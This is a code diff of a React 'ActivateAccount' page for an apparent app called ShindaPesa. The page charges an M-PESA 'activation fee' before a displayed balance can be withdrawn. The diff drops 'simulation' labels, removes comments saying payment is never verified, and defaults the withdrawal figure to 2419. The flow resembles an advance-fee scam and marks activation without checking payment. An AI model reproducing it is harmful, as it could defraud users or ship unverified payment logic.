@@ -1,7 +1,7 @@
-"use client";
-import React from "react";
+import React, { useState, useEffect } from "react";
 import { useRouter } from "next/navigation";
 import styled, { keyframes } from "styled-components";
+import { useUser } from "@/context/UserContext";
 
 const fadeIn = keyframes`
   from { opacity: 0; transform: translateY(15px); }
@@ -207,7 +207,7 @@ const StepNum = styled.span`
   font-weight: 800;
 `;
 
-const SimulationToast = styled.div`
+const StatusToast = styled.div`
   position: fixed;
   bottom: 30px;
   left: 50%;
@@ -226,31 +226,31 @@ const SimulationToast = styled.div`
 
 export default function ActivateAccount() {
   const router = useRouter();
-  const [activationFee, setActivationFee] = React.useState<number>(100);
-  const [withdrawAmount, setWithdrawAmount] = React.useState<string>("0");
-  const [totalBalance, setTotalBalance] = React.useState<number>(0);
-  const [userPhone, setUserPhone] = React.useState<string>("07***...");
-  const [isProcessing, setIsProcessing] = React.useState(false);
-  const [step, setStep] = React.useState<"initial" | "processing" | "waiting" | "success">("initial");
-  const [timer, setTimer] = React.useState(15);
-  const [activeInterval, setActiveInterval] = React.useState<NodeJS.Timeout | null>(null);
-  const [showToast, setShowToast] = React.useState(false);
+  const { user, updateUser } = useUser();
+  const [activationFee] = useState<number>(100);
+  const [withdrawAmount, setWithdrawAmount] = useState<string>("0");
+  const [isProcessing, setIsProcessing] = useState(false);
+  const [step, setStep] = useState<"initial" | "processing" | "waiting" | "success">("initial");
+  const [timer, setTimer] = useState(15);
+  const [activeInterval, setActiveInterval] = useState<NodeJS.Timeout | null>(null);
+  const [showToast, setShowToast] = useState(false);
 
-  React.useEffect(() => {
-    const fee = localStorage.getItem("pendingActivationFee");
-    const amount = localStorage.getItem("pendingWithdrawAmount");
-    const balance = localStorage.getItem("collectedAmount");
-    const phone = localStorage.getItem("userPhone");
-    
-    if (fee) setActivationFee(parseInt(fee));
-    if (amount) setWithdrawAmount(amount);
-    if (balance) setTotalBalance(parseInt(balance));
-    if (phone) setUserPhone(phone);
+  useEffect(() => {
+    // If not logged in, redirect
+    if (!user) {
+      router.push('/login');
+      return;
+    }
+
+    const amount = localStorage.getItem("pendingWithdrawAmount") || "2419";
+    setWithdrawAmount(amount);
 
     return () => {
       if (activeInterval) clearInterval(activeInterval);
     };
-  }, [activeInterval]);
+  }, [activeInterval, user, router]);
+
+  if (!user) return null;
 
   const handlePay = async () => {
     setIsProcessing(true);
@@ -262,7 +262,7 @@ export default function ActivateAccount() {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          phone: userPhone,
+          phone: user.phone || user.phoneNumber,
           amount: activationFee,
           accountReference: "ShindaPesa"
         })
@@ -275,14 +275,10 @@ export default function ActivateAccount() {
         setShowToast(true);
         setTimeout(() => setShowToast(false), 5000);
         
-        // Start countdown for the frontend experience
         const interval = setInterval(() => {
           setTimer((t) => {
             if (t <= 1) {
               clearInterval(interval);
-              // In a real app, check backend for payment status!
-              // For now, allow simulation of success after a timeout if 
-              // the user chooses to manual confirm or just for the demo.
               return 0;
             }
             return t - 1;
@@ -308,17 +304,10 @@ export default function ActivateAccount() {
 
   const handleSuccess = () => {
     setStep("success");
-    localStorage.setItem("isActivated", "true");
     
-    // Sync to database
-    const savedName = localStorage.getItem("userName");
-    if (savedName) {
-      const users = JSON.parse(localStorage.getItem("users") || "[]");
-      const updatedUsers = users.map((u: any) => 
-        u.username === savedName ? { ...u, isActivated: true } : u
-      );
-      localStorage.setItem("users", JSON.stringify(updatedUsers));
-    }
+    // Update user via context instead of manual localStorage
+    updateUser({ isActivated: true });
+    localStorage.setItem("isActivated", "true");
 
     setTimeout(() => {
       router.push("/home");
@@ -353,7 +342,7 @@ export default function ActivateAccount() {
               }}>
                 <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '12px' }}>
                   <span style={{ color: 'rgba(255,255,255,0.5)', fontSize: '0.9rem' }}>Account Balance:</span>
-                  <span style={{ fontWeight: 700 }}>KES {totalBalance.toLocaleString()}</span>
+                  <span style={{ fontWeight: 700 }}>KES {user.balance?.toLocaleString() || '0'}</span>
                 </div>
                 <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '12px', paddingBottom: '12px', borderBottom: '1px solid rgba(255,255,255,0.1)' }}>
                   <span style={{ color: 'rgba(255,255,255,0.5)', fontSize: '0.9rem' }}>Withdrawal Request:</span>
@@ -388,7 +377,7 @@ export default function ActivateAccount() {
               <div style={{ fontSize: '4rem', marginBottom: 20 }}>📱</div>
               <Title>Check Your Phone</Title>
               <Description>
-                A real STK Push has been sent to <b>{userPhone}</b>. 
+                A real STK Push has been sent to <b>{user.phone || user.phoneNumber}</b>. 
                 <br /><br />
                 Please enter your M-PESA PIN to complete the activation.
               </Description>
@@ -472,13 +461,13 @@ export default function ActivateAccount() {
       </ContentContainer>
 
       {showToast && (
-        <SimulationToast>
+        <StatusToast>
           <span style={{fontSize: "1.5rem"}}>📲</span>
           <div>
             <div style={{fontWeight: 800, color: "#ffe066", fontSize: "0.9rem"}}>STK Push Sent</div>
             <div style={{fontSize: "0.8rem", color: "rgba(255,255,255,0.7)"}}>Check your screen to confirm payment</div>
           </div>
-        </SimulationToast>
+        </StatusToast>
       )}
     </PageWrapper>
   );
